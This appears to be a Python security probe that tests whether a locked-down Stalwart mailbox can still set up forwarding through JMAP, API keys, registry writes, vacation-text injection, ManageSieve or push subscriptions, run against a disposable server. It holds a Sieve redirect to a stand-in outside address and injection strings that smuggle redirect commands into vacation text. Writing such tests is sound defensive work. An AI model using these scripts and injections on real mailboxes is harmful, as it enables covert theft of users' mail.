#!/usr/bin/env python3
"""Live probe: can a mailbox send its own mail elsewhere, with main's Sieve lock?

The forwarding gap (probes-email-k2-pool-15-v1 §0): a mailbox login could
install an active Sieve `redirect` over JMAP. Main's fix puts
jmapSieveScriptCreate/Update/Destroy in every K2 mailbox's
`disabledPermissions` and removes leftover user scripts. This probe tries
every other door a mailbox login (its password, an app password, an API key
it mints itself) has, against a real Stalwart:

  G1  JMAP SieveScript/set with the password
  G2  the same with an app password K2 minted
  G3  an API key the mailbox mints itself (Inherit, Replace) → SieveScript/set
  G4  registry writes as the mailbox (x:SieveUserScript, x:Account,
      x:SieveUserInterpreter, x:MtaRoute, x:MtaOutboundStrategy,
      x:NetworkListener, x:WebHook); x:MaskedEmail recorded
  G5  VacationResponse/set with Sieve injected into its text: the script
      Stalwart generates is tokenised and must hold no bare `redirect`;
      also records what it does to K2's own active script
  G6  ManageSieve PUTSCRIPT + SETACTIVE (the default `sieve` listener, which
      K2's enable flow destroys; here it stands for a box where it was
      re-added) with K2's lock (JMAP + ManageSieve writes denied); the old
      JMAP-only lock is recorded for comparison
  G7  PushSubscription/set to an outside URL (state ids only; recorded)

A [FAIL] means that door is open. No mail is sent: the evidence is what
Stalwart stores and activates (an active redirect script was already shown
to forward on 0.16.10 and 0.16.25 by the lockdown probe). Creates only
throwaway principals (`k2fg-*`) and destroys them.

    STALWART_PROBE_ADMIN='admin@example.test:<secret>' \\
      python3 -I tests/mail/stalwart-forward-gap-probe.py --url http://127.0.0.1:18080 \\
      [--domain example.test]

The admin credential comes from the environment only. Run it only against a
disposable Stalwart (tests/mail/stalwart-sandbox-forward-gap.sh starts one).
"""

import argparse
import base64
import json
import os
import secrets
import socket
import ssl
import sys
import urllib.error
import urllib.request

CORE = "urn:ietf:params:jmap:core"
MAIL = "urn:ietf:params:jmap:mail"
SIEVE = "urn:ietf:params:jmap:sieve"
VACATION = "urn:ietf:params:jmap:vacationresponse"
SUBMISSION = "urn:ietf:params:jmap:submission"
REGISTRY = "urn:stalwart:jmap"

# Must match crates/k2-daemon/src/mail/sieve_lockdown.rs SIEVE_WRITE_PERMISSIONS.
# The ManageSieve write permissions (Stalwart crates/managesieve/src/op/*).
MANAGESIEVE_WRITE = ["sievePutScript", "sieveSetActive", "sieveDeleteScript", "sieveRenameScript"]
# K2 before 2026-10-28 denied the JMAP three only (G6b shows that lock).
JMAP_ONLY = ["jmapSieveScriptCreate", "jmapSieveScriptUpdate", "jmapSieveScriptDestroy"]
SIEVE_WRITE = JMAP_ONLY + MANAGESIEVE_WRITE
REDIRECT = 'redirect "exfil@outside.test";\r\n'

FAILED = []


def check(step, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {step}: {detail}", flush=True)
    if not ok:
        FAILED.append(step)


def info(step, detail=""):
    print(f"[INFO] {step}: {detail}", flush=True)


class Client:
    def __init__(self, base, basic=None, bearer=None):
        self.base = base.rstrip("/")
        if basic:
            self.auth = "Basic " + base64.b64encode(f"{basic[0]}:{basic[1]}".encode()).decode()
        else:
            self.auth = f"Bearer {bearer}"
        self._session = None

    def _req(self, method, url, body=None, raw=None, ctype="application/json"):
        url = url if url.startswith("http") else self.base + url
        data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Authorization", self.auth)
        if data is not None:
            req.add_header("Content-Type", ctype)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                out = r.read()
                try:
                    return r.status, json.loads(out or b"null")
                except ValueError:
                    return r.status, out
        except urllib.error.HTTPError as e:
            return e.code, {"httpError": e.code, "body": e.read().decode(errors="replace")[:300]}

    def session(self):
        if self._session is None:
            st, doc = self._req("GET", "/jmap/session")
            if st != 200:
                raise RuntimeError(f"session HTTP {st}: {doc}")
            self._session = doc
        return self._session

    def path(self, key):
        p = self.session()[key]
        if p.startswith("http"):
            p = "/" + p.split("://", 1)[1].split("/", 1)[1]
        return p

    def own_account(self):
        s = self.session()
        prim = s.get("primaryAccounts", {})
        return prim.get(REGISTRY) or prim.get(MAIL) or next(iter(s["accounts"]))

    def call(self, method, args, using=(CORE, REGISTRY)):
        if "accountId" not in args:
            args = dict(args, accountId=self.own_account())
        try:
            st, resp = self._req("POST", self.path("apiUrl"), {"using": list(using), "methodCalls": [[method, args, "0"]]})
        except RuntimeError as e:
            return "http", {"error": str(e)}
        if st != 200:
            return "http", resp
        first = resp["methodResponses"][0]
        return first[0], first[1]

    def upload(self, account, data):
        url = self.path("uploadUrl").replace("{accountId}", account)
        st, resp = self._req("POST", url, raw=data, ctype="application/sieve")
        if st not in (200, 201) or not isinstance(resp, dict) or "blobId" not in resp:
            return None, f"upload HTTP {st}: {resp}"
        return resp["blobId"], None

    def download(self, account, blob):
        url = (self.path("downloadUrl").replace("{accountId}", account).replace("{blobId}", blob)
               .replace("{name}", "s.sieve").replace("{type}", "application/sieve"))
        st, out = self._req("GET", url)
        return out if st == 200 and isinstance(out, bytes) else None


def nonempty(a, k):
    v = a.get(k) if isinstance(a, dict) else None
    return bool(v) if isinstance(v, (dict, list)) else False


def wrote_nothing(name, a):
    if name in ("error", "http"):
        return True
    return not (nonempty(a, "created") or nonempty(a, "updated") or nonempty(a, "destroyed"))


def deny(names, base=None):
    """dav::merge_permissions(base, names, []) for an Inherit/Merge base."""
    dis = dict((base or {}).get("disabledPermissions") or {})
    for n in names:
        dis[n] = True
    return {"@type": "Merge", "enabledPermissions": {}, "disabledPermissions": dis}


def sieve_bare_words(src):
    """Identifiers outside strings and comments (enough to spot a command)."""
    words, i, n = [], 0, len(src)
    while i < n:
        c = src[i]
        if c == '"':
            i += 1
            while i < n and src[i] != '"':
                i += 2 if src[i] == "\\" else 1
            i += 1
        elif c == "#":
            while i < n and src[i] != "\n":
                i += 1
        elif src.startswith("/*", i):
            j = src.find("*/", i + 2)
            i = n if j < 0 else j + 2
        elif src.startswith("text:", i):
            j = src.find("\n.\r\n", i)
            if j < 0:
                j = src.find("\n.\n", i)
            i = n if j < 0 else j + 3
        elif c.isalpha() or c == "_":
            j = i
            while j < n and (src[j].isalnum() or src[j] in "_-"):
                j += 1
            words.append(src[i:j].lower())
            i = j
        else:
            i += 1
    return words


def managesieve(port, user, pw, script):
    """PUTSCRIPT + SETACTIVE as `user`; returns {verb: last line}."""
    out = {}
    s = socket.create_connection(("127.0.0.1", port), timeout=20)
    f = s.makefile("rb")

    def resp():
        lines = []
        while True:
            line = f.readline()
            if not line:
                return lines + ["EOF"]
            text = line.decode(errors="replace").rstrip()
            lines.append(text)
            u = text.upper()
            if u.startswith("OK") or u.startswith("NO") or u.startswith("BYE"):
                return lines

    def cmd(data):
        s.sendall(data)
        return resp()

    out["GREETING"] = resp()[-1]
    st = cmd(b"STARTTLS\r\n")[-1]
    out["STARTTLS"] = st
    if st.upper().startswith("OK"):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname="mail.example.test")
        f = s.makefile("rb")
        out["CAPS"] = resp()[-1]
    tok = base64.b64encode(("\0" + user + "\0" + pw).encode()).decode()
    out["AUTH"] = cmd(('AUTHENTICATE "PLAIN" "%s"\r\n' % tok).encode())[-1]
    body = script.encode()
    out["PUTSCRIPT"] = cmd(b'PUTSCRIPT "gap" {%d+}\r\n' % len(body) + body + b"\r\n")[-1]
    out["SETACTIVE"] = cmd(b'SETACTIVE "gap"\r\n')[-1]
    try:
        cmd(b"LOGOUT\r\n")
    except OSError:
        pass
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True)
    ap.add_argument("--domain")
    args = ap.parse_args()
    cred = os.environ.get("STALWART_PROBE_ADMIN", "")
    if ":" not in cred:
        sys.exit("set STALWART_PROBE_ADMIN=<admin user>:<secret> in the environment")
    admin_user, admin_pw = cred.split(":", 1)
    domain = args.domain or admin_user.split("@", 1)[-1]
    tag = secrets.token_hex(3)
    admin = Client(args.url, basic=(admin_user, admin_pw))
    n, a = admin.call("x:Domain/query", {"filter": {"name": domain}})
    if n != "x:Domain/query" or not a.get("ids"):
        sys.exit(f"domain {domain} not found: {n} {a}")
    did = a["ids"][0]
    info("fixture", f"domain {domain} ({did}); run {tag}")
    made = []

    def account_create(name, perms, admin_role=False):
        pw = secrets.token_urlsafe(24)
        acct = {"@type": "User", "name": name, "domainId": did,
                "credentials": {"0": {"@type": "Password", "secret": pw}}}
        if admin_role:
            acct["roles"] = {"@type": "Admin"}
        else:
            acct["quotas"] = {"maxDiskQuota": 104857600, "maxEmails": 1000}
        if perms is not None:
            acct["permissions"] = perms
        n, a = admin.call("x:Account/set", {"create": {"k2": acct}})
        cid = ((a.get("created") or {}).get("k2") or {}).get("id") if n == "x:Account/set" else None
        if cid:
            made.append(cid)
            return cid, pw, None
        return None, None, f"{n} {json.dumps(a)[:300]}"

    # K2's service account + its key (the enable flow), as K2 writes scripts.
    svc_id, _, err = account_create(f"k2fg-svc-{tag}", None, admin_role=True)
    if not svc_id:
        sys.exit(f"service account: {err}")
    n, a = admin.call("x:ApiKey/set", {"accountId": svc_id, "create": {"k": {
        "description": "k2", "permissions": {"@type": "Inherit"}, "allowedIps": {}}}})
    key = ((a.get("created") or {}).get("k") or {}).get("secret")
    if not key:
        sys.exit(f"service key: {n} {json.dumps(a)[:300]}")
    svc = Client(args.url, bearer=key)

    gina, gina_pw, err = account_create(f"k2fg-gina-{tag}", deny(SIEVE_WRITE))
    if not gina:
        sys.exit(f"gina: {err}")
    gina_addr = f"k2fg-gina-{tag}@{domain}"
    user = Client(args.url, basic=(gina_addr, gina_pw))

    def scripts(account):
        n, a = svc.call("SieveScript/get", {"accountId": account, "ids": None}, using=(CORE, SIEVE))
        if n != "SieveScript/get":
            return None, f"{n} {json.dumps(a)[:200]}"
        return a.get("list") or [], None

    def names(account):
        lst, err = scripts(account)
        return err or [s["name"] + ("*" if s.get("isActive") else "") for s in lst]

    def plant(client, label):
        blob, err = client.upload(gina, REDIRECT.encode())
        if not blob:
            return "upload", {"error": err}
        return client.call("SieveScript/set", {"accountId": gina, "create": {"x": {"name": label, "blobId": blob}},
                                               "onSuccessActivateScript": "#x"}, using=(CORE, SIEVE))

    # ── G1 / G2 ─────────────────────────────────────────────────────
    n, a = plant(user, "g1")
    check("G1 password: JMAP SieveScript/set refused", wrote_nothing(n, a), f"{n} {json.dumps(a)[:200]}")
    n, a = svc.call("x:AppPassword/set", {"accountId": gina, "create": {"k": {
        "description": "probe", "permissions": {"@type": "Inherit"}, "allowedIps": {}}}})
    ap_secret = ((a.get("created") or {}).get("k") or {}).get("secret")
    if ap_secret:
        n, a = plant(Client(args.url, basic=(gina_addr, ap_secret)), "g2")
        check("G2 app password: JMAP SieveScript/set refused", wrote_nothing(n, a), f"{n} {json.dumps(a)[:200]}")
    else:
        check("G2 app password minted for the check", False, f"{n} {json.dumps(a)[:200]}")

    # ── G3 self-minted API keys ─────────────────────────────────────
    for label, perms in [
        ("Inherit", {"@type": "Inherit"}),
        ("Replace", {"@type": "Replace", "permissions": {"jmapSieveScriptCreate": True,
                                                         "jmapSieveScriptUpdate": True, "authenticate": True}}),
    ]:
        n, a = user.call("x:ApiKey/set", {"accountId": gina, "create": {"k": {
            "description": f"probe-{label}", "permissions": perms, "allowedIps": {}}}})
        sec = ((a.get("created") or {}).get("k") or {}).get("secret") if n == "x:ApiKey/set" else None
        if not sec:
            info(f"G3 self-minted API key ({label})", f"not minted: {n} {json.dumps(a)[:200]}")
            continue
        info(f"G3 self-minted API key ({label})", "the mailbox CAN mint one (fixed on the k2/mail-apikeys lane)")
        n, a = plant(Client(args.url, bearer=sec), "g3")
        check(f"G3 API key ({label}): JMAP SieveScript/set refused", wrote_nothing(n, a), f"{n} {json.dumps(a)[:200]}")

    # ── G4 registry writes as the mailbox ───────────────────────────
    tries = [
        ("x:SieveUserScript/set", {"create": {"s": {"name": "gap", "contents": REDIRECT}}}),
        ("x:Account/set", {"update": {gina: {"description": "probe"}}}),
        ("x:SieveUserInterpreter/set", {"update": {"singleton": {"maxRedirects": 9}}}),
        ("x:MtaRoute/set", {"create": {"r": {"@type": "Relay", "name": "gap", "address": "192.0.2.1",
                                              "port": 25, "protocol": "smtp", "implicitTls": False}}}),
        ("x:MtaOutboundStrategy/set", {"update": {"singleton": {"route": {"else": "'local'"}}}}),
        ("x:NetworkListener/set", {"create": {"l": {"name": "gap", "bind": {"127.0.0.1:24191": True},
                                                     "protocol": "manageSieve"}}}),
        ("x:WebHook/set", {"create": {"w": {"url": "http://192.0.2.1/hook", "eventsPolicy": "include"}}}),
    ]
    for method, args_ in tries:
        n, a = user.call(method, args_)
        check(f"G4 mailbox {method} refused", wrote_nothing(n, a), f"{n} {json.dumps(a)[:200]}")
    n, a = user.call("x:MaskedEmail/set", {"create": {"m": {"enabled": True, "accountId": gina,
                                                            "email": f"m-{tag}@outside.test"}}})
    info("G4 x:MaskedEmail/set (an inbound alias on the box, never a forward)", f"{n} {json.dumps(a)[:200]}")

    # ── G5 VacationResponse injection + effect on K2's script ───────
    k2_src = 'require ["copy"];\r\nredirect :copy "k2fg-hank@%s";\r\n' % domain
    blob, err = svc.upload(gina, k2_src.encode())
    n, a = svc.call("SieveScript/set", {"accountId": gina, "create": {"k": {"name": "k2", "blobId": blob}},
                                        "onSuccessActivateScript": "#k"}, using=(CORE, SIEVE)) if blob else ("upload", err)
    info("G5 K2's own `k2` script written by the service key", f"{n}; scripts {names(gina)}")
    inj = 'back"; redirect "inj@outside.test"; #'
    n, a = user.call("VacationResponse/set", {"accountId": gina, "update": {"singleton": {
        "isEnabled": True, "subject": inj, "textBody": inj + "\n" + 'x" ; redirect "inj2@outside.test";'}}},
        using=(CORE, VACATION))
    info("G5 VacationResponse/set as the mailbox", f"{n} {json.dumps(a)[:200]}")
    lst, err = scripts(gina)
    info("G5 scripts after the vacation set", names(gina))
    vac = [s for s in (lst or []) if s.get("name") not in ("k2", "k2-forward")]
    for s in vac:
        src = svc.download(gina, s["blobId"])
        if src is None:
            check(f"G5 read script {s['name']}", False, "download failed")
            continue
        text = src.decode(errors="replace")
        text = text[: text.find("\x00")] if "\x00" in text else text
        words = sieve_bare_words(text)
        check(f"G5 vacation script {s['name']} has no bare redirect/notify",
              "redirect" not in words and "notify" not in words, f"commands {sorted(set(words))[:20]}")
    if not vac:
        info("G5 no vacation script found", names(gina))
    k2_active = any(s.get("name") == "k2" and s.get("isActive") for s in (lst or []))
    info("G5 K2's `k2` script still active while vacation is on", k2_active)
    user.call("VacationResponse/set", {"accountId": gina, "update": {"singleton": {"isEnabled": False}}},
              using=(CORE, VACATION))
    info("G5 scripts after vacation off", names(gina))

    # ── G6 ManageSieve ──────────────────────────────────────────────
    n, a = admin.call("x:NetworkListener/get", {"ids": None})
    ms_port = None
    for l in (a.get("list") or []):
        if (l.get("protocol") or "").lower() == "managesieve":
            ms_port = int(next(iter(l["bind"])).rsplit(":", 1)[1])
    if ms_port is None:
        info("G6 ManageSieve", "no manageSieve listener on this Stalwart; skipped")
    else:
        info("G6 ManageSieve listener (K2's enable flow destroys it; present here)", f"127.0.0.1:{ms_port}")
        before = names(gina)
        try:
            out = managesieve(ms_port, gina_addr, gina_pw, REDIRECT)
        except OSError as e:
            out = {"error": str(e)}
        after = names(gina)
        info("G6a ManageSieve as a mailbox with K2's lock (JMAP + ManageSieve)", json.dumps(out))
        opened = str(out.get("PUTSCRIPT", "")).upper().startswith("OK") or "gap*" in after
        check("G6a ManageSieve write refused with K2's lock", not opened, f"scripts {before} -> {after}")
        # The lock K2 shipped before 2026-10-28 (JMAP only), for the record.
        ivan, ivan_pw, err = account_create(f"k2fg-ivan-{tag}", deny(JMAP_ONLY))
        if ivan:
            try:
                out = managesieve(ms_port, f"k2fg-ivan-{tag}@{domain}", ivan_pw, REDIRECT)
            except OSError as e:
                out = {"error": str(e)}
            info("G6b ManageSieve with the old JMAP-only lock", f"{json.dumps(out)}; scripts {names(ivan)}")
        else:
            info("G6b old-lock account", err)

    # ── G7 push subscription to an outside URL (records only) ──────
    n, a = user.call("PushSubscription/set", {"create": {"p": {"deviceClientId": "probe",
                                                                "url": "https://192.0.2.1/push", "types": ["Email"]}}},
                     using=(CORE,))
    info("G7 PushSubscription/set to an outside URL (state ids only, no mail content)", f"{n} {json.dumps(a)[:200]}")

    # ── cleanup ─────────────────────────────────────────────────────
    for aid in made:
        admin.call("x:Account/set", {"destroy": [aid]})
    print(f"== forwarding gap: {len(FAILED)} failed check(s): {FAILED} ==", flush=True)
    sys.exit(1 if FAILED else 0)


if __name__ == "__main__":
    main()
